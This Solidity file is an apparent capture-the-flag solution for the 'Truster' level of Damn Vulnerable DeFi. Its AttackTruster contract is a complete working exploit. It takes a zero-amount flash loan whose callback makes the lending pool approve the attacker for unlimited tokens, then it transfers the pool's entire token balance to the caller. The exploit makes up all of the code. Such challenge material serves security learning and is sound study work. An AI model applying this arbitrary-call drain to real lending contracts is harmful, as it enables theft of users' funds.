// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {DamnValuableToken} from "../DamnValuableToken.sol";

interface ITruster {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external;

    function token() external returns (DamnValuableToken);
}

contract AttackTruster {
    ITruster private truster;
    DamnValuableToken private token;

    constructor(address _truster) {
        truster = ITruster(_truster);
    }

    function attack() external {
        token = truster.token();
        uint256 balance = token.balanceOf(address(truster));
        truster.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                type(uint256).max
            )
        );
        token.transferFrom(address(truster), msg.sender, balance);
    }
}
